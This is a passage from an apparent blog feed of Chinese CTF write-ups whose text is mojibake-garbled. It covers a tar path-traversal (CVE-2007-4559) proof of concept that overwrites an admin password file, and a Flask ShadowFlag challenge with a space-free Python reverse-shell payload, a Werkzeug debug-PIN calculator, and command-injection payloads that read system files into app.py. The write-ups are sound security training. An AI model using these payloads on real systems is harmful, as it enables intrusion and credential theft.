user1/</span><br></pre></td></tr></table></figure><p>åˆ¶ä½œä¿®æ”¹åçš„jsonæ–‡ä»¶</p><p>å†…å®¹å¯ä»¥ç”¨ä»¥ä¸‹è„šæœ¬ç”Ÿæˆ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"> </span><br><span class="line">password = <span class="string">&#x27;123456&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;userinfo.json&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(json.dumps(&#123;<span class="string">&#x27;admin&#x27;</span>: hashlib.sha512(password.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()&#125;).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rm -f flag</span><br><span class="line"></span><br><span class="line">vim flag</span><br><span class="line"></span><br><span class="line">tar -cvzf upload2.tar.gz user1/</span><br></pre></td></tr></table></figure><p>ä¸Šä¼ åé€€å‡ºç™»å½•ï¼Œç”¨adminè´¦æˆ·ç™»å½•å³å¯</p><p><a href="https://imgse.com/i/ppKl53F"><img src="https://s1.ax1x.com/2023/03/11/ppKl53F.png" alt="ppKl53F.png"></a></p><h2 id="æ–¹æ³•äºŒ"><a href="#æ–¹æ³•äºŒ" class="headerlink" title="æ–¹æ³•äºŒ"></a>æ–¹æ³•äºŒ</h2><p><strong>CVE-2007-4559</strong></p><p>åŸç†ï¼šå½“ä½¿ç”¨taræ‰“åŒ…ä¸€ä¸ªåŒ…å«â€œ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwdâ€ï¼Œå¹¶ç”¨ç®¡ç†å‘˜æƒé™è§£åŒ…æ—¶ï¼Œ&#x2F;etc&#x2F;passwdæ–‡ä»¶ä¼šè¢«è¦†ç›–ï¼ŒåŒç†ä½¿ç”¨æ–‡ä»¶é“¾æ¥ä¹Ÿå¯ä»¥äº§ç”ŸåŒæ ·çš„æ•ˆæœã€‚</p><p>åˆ©ç”¨ç›®å½•ç©¿è¶Šç›´æ¥è¦†ç›–æ‰jsonæ–‡ä»¶</p><p><strong>poc</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os, hashlib, json</span><br><span class="line"></span><br><span class="line">username = <span class="string">&#x27;user1&#x27;</span>  <span class="comment"># ä½ æ³¨å†Œæ—¶ç”¨çš„ç”¨æˆ·åï¼Œå°½é‡åˆ«æœ‰å¥‡æ€ªçš„ç¬¦å·</span></span><br><span class="line">admin_passwd = <span class="string">&#x27;123456&#x27;</span>  <span class="comment"># ä¹‹åè¦ä½¿ç”¨adminè´¦æˆ·ç™»é™†æ—¶çš„å¯†ç </span></span><br><span class="line"></span><br><span class="line">os.makedirs(<span class="string">&#x27;conf&#x27;</span>)</span><br><span class="line">os.makedirs(os.sep.join([os.getcwd(), <span class="string">&#x27;userData&#x27;</span>, username]))</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(os.sep.join([os.getcwd(), <span class="string">&#x27;conf&#x27;</span>, <span class="string">&#x27;userinfo.json&#x27;</span>]), <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> tFile:</span><br><span class="line">    tFile.write(json.dumps(&#123;<span class="string">&#x27;admin&#x27;</span>: hashlib.sha512(admin_passwd.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()&#125;).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">userDataDir = os.sep.join([os.getcwd(), <span class="string">&#x27;userData&#x27;</span>])</span><br><span class="line">os.system(<span class="string">f&#x27;cd &quot;<span class="subst">&#123;userDataDir&#125;</span>&quot; &amp;&amp; tar cPzvf upload.tar.gz <span class="subst">&#123;username&#125;</span>/../../conf/userinfo.json&#x27;</span>)</span><br></pre></td></tr></table></figure><p>å°†ç”Ÿæˆçš„upload.tar.gzä¸Šä¼ å³å¯ï¼Œç„¶åç™»å½•adminè´¦æˆ·è·å–flag</p><h1 id="NSSRound-7-Team-ShadowFlag"><a href="#NSSRound-7-Team-ShadowFlag" class="headerlink" title="[NSSRound#7 Team]ShadowFlag"></a>[NSSRound#7 Team]ShadowFlag</h1><p>app.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"> </span><br><span class="line">app = Flask(__name__)</span><br><span class="line"> </span><br><span class="line">flag1 = <span class="built_in">open</span>(<span class="string">&quot;/tmp/flag1.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/tmp/flag2.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    flag2 = f.read()</span><br><span class="line">tag = <span class="literal">False</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;app.py&quot;</span>, <span class="string">&quot;r+&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/shell&quot;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shell</span>():</span><br><span class="line">    <span class="keyword">global</span> tag</span><br><span class="line">    <span class="keyword">if</span> tag != <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">global</span> flag1</span><br><span class="line">        <span class="keyword">del</span> flag1</span><br><span class="line">        tag = <span class="literal">True</span></span><br><span class="line">    os.system(<span class="string">&quot;rm -f /tmp/flag1.txt /tmp/flag2.txt&quot;</span>)</span><br><span class="line">    action = request.form[<span class="string">&quot;act&quot;</span>]</span><br><span class="line">    <span class="keyword">if</span> action.find(<span class="string">&quot; &quot;</span>) != -<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Nonono&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        os.system(action)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Wow&quot;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">404</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">error_date</span>(<span class="params">error</span>):</span><br><span class="line">    sleep(<span class="number">5</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;æ‰«æ‰«æ‰«ï¼Œæ‰«å•¥ä¸œæ–¹æ˜ç å‘¢[æ€’]&quot;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure><p>å½“æ¥æ”¶åˆ°POSTè¯·æ±‚çš„&#x2F;shellè·¯ç”±æ—¶ï¼Œä¼šæ‰§è¡Œshell()å‡½æ•°ã€‚è¯¥å‡½æ•°é¦–å…ˆé€šè¿‡å…¨å±€å˜é‡tagçš„å€¼æ¥åˆ¤æ–­æ˜¯å¦ä¸ºé¦–æ¬¡è®¿é—®è¯¥è·¯ç”±ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™å°†å…¨å±€å˜é‡flag1åˆ é™¤å¹¶å°†tagæ ‡è®°ä¸ºTrueï¼Œä¹‹åä¸å†æ‰§è¡Œæ­¤åˆ¤æ–­ã€‚</p><p>æ¥ç€ï¼Œå‡½æ•°ä¼šåˆ é™¤ç³»ç»Ÿä¸­çš„flag1å’Œflag2ã€‚</p><p>æœ€åï¼Œå‡½æ•°ä¼šä»POSTè¯·æ±‚çš„å‚æ•°ä¸­è·å–åä¸ºâ€actâ€çš„å€¼ï¼Œå¦‚æœä¸åŒ…å«ç©ºæ ¼ï¼Œåˆ™ä¼šæ‰§è¡Œå‘½ä»¤</p><p>ä¸¤ä¸ªé—®é¢˜</p><ul><li>ä¸èƒ½åŒ…å«ç©ºæ ¼</li><li>æ‰§è¡Œå‘½ä»¤æ²¡æœ‰å›æ˜¾</li></ul><h2 id="åå¼¹shell"><a href="#åå¼¹shell" class="headerlink" title="åå¼¹shell"></a>åå¼¹shell</h2><p>ç©ºæ ¼å¯ä»¥ç”¨<code>$IFS</code>ä»£æ›¿ï¼Œæ²¡æœ‰å›æ˜¾é‚£ä¹ˆå°±åå¼¹shell</p><p>å› ä¸ºè¯¥é¢˜ç›®ç¯å¢ƒæ˜¯flaskï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨pythonåå¼¹shellï¼Œå‚è€ƒ[PayloadsAllTheThings&#x2F;Reverse Shell](<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology</a> and Resources&#x2F;Reverse Shell Cheatsheet.md#awk)</p><p><strong>payload</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">python3$</span><span class="language-bash">IFS-c<span class="variable">$IFS</span><span class="string">&#x27;a=__import__;s=a(&quot;socket&quot;).socket;o=a(&quot;os&quot;).dup2;p=a(&quot;pty&quot;).spawn;c=s();c.connect((&quot;xx.xx.xx.xx&quot;,2333));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(&quot;/bin/sh&quot;)&#x27;</span></span></span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/ppK3dSS"><img src="https://s1.ax1x.com/2023/03/11/ppK3dSS.png" alt="ppK3dSS.png"></a></p><p>å‰é¢è¯´åˆ°ï¼Œflag1æ˜¯åœ¨&#x2F;tmpç›®å½•ä¸‹ï¼Œä½†æ˜¯åœ¨æˆ‘ä»¬ç¬¬ä¸€æ¬¡è®¿é—®&#x2F;shellè·¯ç”±æ—¶å°±ä¼šæ‰§è¡Œ<code>os.system(&quot;rm -f /tmp/flag1.txt /tmp/flag2.txt&quot;)</code>ï¼Œå°†flagæ–‡ä»¶åˆ é™¤ï¼Œä½†æ˜¯æ³¨æ„<code>flag1 = open(&quot;/tmp/flag1.txt&quot;, &quot;r&quot;)</code>ï¼Œè¿™é‡Œä½¿ç”¨äº† open å‡½æ•°æ‰“å¼€ flag1 æ–‡ä»¶ï¼Œä½†æ²¡æœ‰ä½¿ç”¨ with è¯­å¥å…³é—­æ–‡ä»¶å¥æŸ„ï¼Œå› ä¸ºflaskè¿›ç¨‹è¿˜åœ¨è¿è¡Œï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨&#x2F;proc&#x2F;[pid]&#x2F;fdçš„å†…å­˜ä¸­æ‰¾åˆ°å®ƒ</p><p><a href="https://imgse.com/i/ppKGoPx"><img src="https://s1.ax1x.com/2023/03/11/ppKGoPx.png" alt="ppKGoPx.png"></a></p><p>å†çœ‹flag2.txtçš„æ“ä½œè¿‡ç¨‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/tmp/flag2.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    flag2 = f.read()</span><br></pre></td></tr></table></figure><p>ç”¨withä¼šé»˜è®¤æ‰“å¼€ä½¿ç”¨åå…³é—­è¿™ä¸ªæ–‡ä»¶ï¼Œæ‰€ä»¥æˆ‘ä»¬æ— æ³•åœ¨è¿›ç¨‹ä¸­æ‰¾åˆ°flag2ï¼Œåªæœ‰ä»ç¯å¢ƒé‡Œé¢å»æ‰¾ï¼Œåœ¨é«˜ç‰ˆæœ¬flaskä¸­ï¼Œå­˜åœ¨<code>Flask debug PIN</code>ï¼Œè®¿é—®<code> http://ip:port/console</code> è·¯å¾„è¾“å…¥æ­£ç¡®PINå€¼å³å¯è¿›å…¥è°ƒè¯•ç¯å¢ƒ</p><p>æ¥ä¸‹æ¥å°±æ˜¯è®¡ç®—pinå€¼ï¼Œè¿™é‡Œæ˜¯å·¨é­”å¸ˆå‚…è®¡ç®—pinå€¼çš„è„šæœ¬ï¼Œå…¶ä¸­æœ‰æ³¨é‡Šçš„åœ°æ–¹éƒ½éœ€è¦å»è®¡ç®—</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"></span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;ctf&#x27;</span>  <span class="comment"># /etc/passwd</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,  <span class="comment"># é»˜è®¤å€¼</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,  <span class="comment"># é»˜è®¤å€¼</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.10/site-packages/flask/app.py&#x27;</span>  <span class="comment"># æŠ¥é”™å¾—åˆ°</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="built_in">str</span>(<span class="built_in">int</span>(<span class="string">&quot;02:42:ac:02:05:22&quot;</span>.replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;&quot;</span>), <span class="number">16</span>)),  <span class="comment"># /sys/class/net/eth0/address 16è¿›åˆ¶è½¬10è¿›åˆ¶</span></span><br><span class="line">    <span class="comment"># machine_idç”±ä¸‰ä¸ªåˆå¹¶(dockerå°±åä¸¤ä¸ª)ï¼š1./etc/machine-id 2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup</span></span><br><span class="line">    <span class="string">&quot;a4473a34-a602-43b3-bd38-c11e15f45ae7&quot;</span> + <span class="string">&quot;07c41748f9fca54ca8b8a0baa9aa27cd181ab36fdeb0ee580a02b705a66c6ffd&quot;</span></span><br><span class="line">    <span class="comment"># /proc/self/cgroup</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.sha1()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure><p>å…ˆçœ‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;ctf&#x27;</span><span class="comment"># /etc/passwd</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,<span class="comment"># é»˜è®¤å€¼</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,<span class="comment"># é»˜è®¤å€¼</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.10/site-packages/flask/app.py&#x27;</span> <span class="comment"># æŠ¥é”™å¾—åˆ°</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure><ul><li><p>ç¬¬ä¸€ä¸ªæ˜¯å½“å‰ç”¨æˆ·åï¼Œç›´æ¥whoami</p></li><li><p>ç¬¬å››ä¸ªæ˜¯åœ¨æŠ¥é”™é¡µé¢å¾—åˆ°ï¼Œåœ¨&#x2F;shellè·¯ç”±ä¼ å…¥ä¸ä¸ºactçš„POSTæ•°æ®</p></li></ul><p><a href="https://imgse.com/i/ppKJ4Og"><img src="https://s1.ax1x.com/2023/03/11/ppKJ4Og.png" alt="ppKJ4Og.png"></a></p><p>å†çœ‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">private_bits = [</span><br><span class="line">    <span class="built_in">str</span>(<span class="built_in">int</span>(<span class="string">&quot;02:42:ac:02:05:22&quot;</span>.replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;&quot;</span>), <span class="number">16</span>)),  <span class="comment"># /sys/class/net/eth0/address 16è¿›åˆ¶è½¬10è¿›åˆ¶</span></span><br><span class="line">    <span class="comment"># machine_idç”±ä¸‰ä¸ªåˆå¹¶(dockerå°±åä¸¤ä¸ª)ï¼š1./etc/machine-id 2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup</span></span><br><span class="line">    <span class="string">&quot;a4473a34-a602-43b3-bd38-c11e15f45ae7&quot;</span> + <span class="string">&quot;07c41748f9fca54ca8b8a0baa9aa27cd181ab36fdeb0ee580a02b705a66c6ffd&quot;</span></span><br><span class="line">    <span class="comment"># /proc/self/cgroup</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>å…¶å®æ³¨é‡Šè¯´çš„å¾ˆæ¸…æ¥šäº†ï¼Œç›´æ¥catæ³¨é‡Šæ‰€è¯´æ–‡ä»¶ï¼ŒæŠŠå¯¹åº”çš„å€¼å¡«è¿›å»å³å¯</p><p>è¿è¡Œè·å¾—pinç åï¼Œè¿›å…¥è°ƒè¯•ç¯å¢ƒ</p><p><a href="https://imgse.com/i/ppKYRE9"><img src="https://s1.ax1x.com/2023/03/11/ppKYRE9.png" alt="ppKYRE9.png"></a></p><p>ä½†æ˜¯è¿è¡Œå¾—ä¸åˆ°flag2</p><p>è¿™æ—¶ï¼Œéœ€è¦å»åˆ°&#x2F;shellè·¯ç”±ï¼Œå¼•å‘æŠ¥é”™ï¼Œç„¶ååœ¨æ­¤è·¯å¾„ä¸‹è¾“å…¥flag2</p><p><a href="https://imgse.com/i/ppKY49x"><img src="https://s1.ax1x.com/2023/03/11/ppKY49x.png" alt="ppKY49x.png"></a></p><h2 id="ä¸å‡ºç½‘rce"><a href="#ä¸å‡ºç½‘rce" class="headerlink" title="ä¸å‡ºç½‘rce"></a>ä¸å‡ºç½‘rce</h2><p>å‚è€ƒ<a href="https://www.cnblogs.com/nLesxw/p/web_shadowflag.html">æ–‡ç« </a>ï¼Œå¸ˆå‚…tql</p><p>é€šè¿‡å°†flagæ–‡ä»¶å†…å®¹å†™åˆ°app.pyé‡Œä»è€Œè·å–flag</p><p>ä½†ä¼šé‡åˆ°ä¸€ä¸ªé—®é¢˜å½“ä½ æŠŠå†…å®¹å†™è¿›å»åï¼Œå†æ¬¡è®¿é—®shellè·¯å¾„ï¼Œå°±ä¼šæŠ¥é”™ï¼Œæ‰€ä»¥éœ€è¦æŠŠå†™è¿›å»çš„å†…å®¹æ³¨é‡Šã€‚</p><p>è€Œå•è¡Œæ³¨é‡Šç¬¦ <code># </code>ä¹Ÿä¸è¡Œ,å‘ç°åœ¨è¯»å–å¤§é‡çš„å†…å®¹è¿”å›æ—¶ä¹Ÿä¼šæŠ¥é”™ï¼Œæ‰€ä»¥éœ€ä½¿ç”¨<code>&#39;&#39;&#39;</code>ã€‚</p><p>è¯»flag1</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">act=touch$&#123;IFS&#125;/tmp/flag1.txt;touch$&#123;IFS&#125;/tmp/flag2.txt;echo$&#123;IFS&#125;&quot;&#x27;&#x27;&#x27;`find$&#123;IFS&#125;/$&#123;IFS&#125;-name$&#123;IFS&#125;flag*.*`&#x27;&#x27;&#x27;&quot;&gt;&gt;./app.py</span><br></pre></td></tr></table></figure><p>åŒæ ·è¯»å–pinç æ‰€éœ€æ–‡ä»¶</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">act=touch$&#123;IFS&#125;/tmp/flag1.txt;touch$&#123;IFS&#125;/tmp/flag2.txt;echo$&#123;IFS&#125;&quot;&#x27;&#x27;&#x27;`cat$&#123;IFS&#125;/sys/class/net/eth0/address`&#x27;&#x27;&#x27;&quot;&gt;&gt;./app.py</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022-N1CTF-JAVA</title>
      <link href="/2023/03/03/2022-N1CTF-JAVA/"/>
      <url>/2023/03/03/2022-N1CTF-JAVA/</url>
      
        <content type="html"><![CDATA[<h1 id="2022-N1CTF-JAVA"><a href="#2022-N1CTF-JAVA" class="headerlink" title="2022 N1CTF JAVA"></a>2022 N1CTF JAVA</h1><h2 id="Easy-S2"><a href="#Easy-S2" class="headerlink" title="Easy_S2"></a>Easy_S2</h2><p>æ‹¿åˆ°waråŒ…ååç¼–è¯‘</p><p><strong>web.xml</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">&quot;3.1&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>struts2<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.apache.struts2.dispatcher.filter.StrutsPrepareAndExecuteFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>struts2<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">security-constraint</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>pass-static<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">web-resource-collection</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">web-resource-name</span>&gt;</span>static<span class="tag">&lt;/<span class="name">web-resource-name</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/img/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/index.jsp<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">web-resource-collection</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">security-constraint</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">security-constraint</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>interceptor<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">web-resource-collection</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span 